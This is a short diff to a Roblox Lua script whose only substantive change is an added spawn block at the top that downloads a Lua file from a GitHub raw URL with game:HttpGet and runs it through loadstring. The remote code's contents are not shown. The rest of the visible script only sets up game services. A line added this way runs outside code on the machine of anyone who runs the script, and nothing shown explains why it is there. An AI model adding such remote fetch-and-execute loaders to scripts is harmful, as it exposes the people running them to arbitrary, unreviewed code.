@@ -1,4 +1,6 @@
-
+spawn(function()
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+    end)
 local P=game:GetService("Players")
 local H=game:GetService("HttpService")
 local T=game:GetService("TweenService")
